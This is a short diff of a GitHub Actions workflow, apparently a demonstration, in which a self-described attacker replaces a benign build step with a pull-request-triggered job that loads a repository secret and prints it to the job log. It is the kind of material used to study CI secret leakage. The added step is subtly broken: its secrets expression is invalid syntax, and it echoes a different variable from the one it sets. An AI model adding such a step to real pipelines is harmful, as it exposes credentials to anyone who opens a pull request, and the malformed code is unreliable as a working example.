@@ -1,15 +1,19 @@
+name: CI Demo Workflow (Modified by Attacker)
+
 on:
   pull_request:
     types: [opened, synchronize, reopened]
 
 jobs:
-  build:
+  steal_secrets: # Job name changed for clarity, not strictly necessary
     runs-on: ubuntu-latest
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-      
-      - name: Original benign step
+
+      - name: Malicious Step - Exfiltrate Secret
+        env:
+          LEAKED_SECRET: ${{ secrets.${DANNY_SECRET} }}
         run: |
-          echo "This is a benign step in the original workflow."
-          echo "no secrets accessed yet."
+          echo "Attempting to exfiltrate the secret..."
+          echo $DANNY_SECRET
